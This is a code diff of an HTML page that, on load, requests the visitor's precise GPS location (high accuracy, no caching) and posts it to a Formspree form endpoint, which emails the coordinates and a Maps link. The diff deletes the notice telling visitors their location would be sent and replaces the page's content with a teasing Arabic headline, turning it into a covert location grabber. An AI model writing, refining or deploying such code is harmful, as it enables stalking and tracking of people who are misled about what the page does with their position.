@@ -3,20 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send Location via Email</title>
+    <title>Send Accurate GPS Location</title>
     <script>
-        // Function to send location automatically on page load
+        // Function to send the most accurate GPS location
         function sendLocation() {
             if ("geolocation" in navigator) {
-                // Request permission to access location
+                // Request permission and use high accuracy
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        const { latitude, longitude } = position.coords; // Actual location
+                        const { latitude, longitude, accuracy } = position.coords; // GPS location
+                        console.log(`Latitude: ${latitude}, Longitude: ${longitude}, Accuracy: ${accuracy} meters`);
 
                         const emailData = new FormData();
                         emailData.append('latitude', latitude);
                         emailData.append('longitude', longitude);
-                        emailData.append('message', `Location:\nLatitude: ${latitude}, Longitude: ${longitude}\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`);
+                        emailData.append('accuracy', accuracy); // Include accuracy info
+                        emailData.append(
+                            'message',
+                            `Location:\nLatitude: ${latitude}, Longitude: ${longitude}, Accuracy: ${accuracy} meters\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`
+                        );
 
                         // Send the location via Formspree
                         fetch('https://formspree.io/f/xjkvdbwg', {
@@ -35,6 +40,11 @@
                     },
                     (error) => {
                         alert("Error fetching location: " + error.message);
+                    },
+                    {
+                        enableHighAccuracy: true, // Request the most accurate location
+                        timeout: 10000, // Set a timeout to avoid indefinite waiting
+                        maximumAge: 0 // Do not use cached locations
                     }
                 );
             } else {
@@ -48,6 +58,6 @@
 </head>
 <body>
     <h1>هسيبك لخيالك</h1>
-    <p>This page will automatically try to send your location when you open it. Please ensure to allow location permissions when prompted.</p>
+
 </body>
 </html>
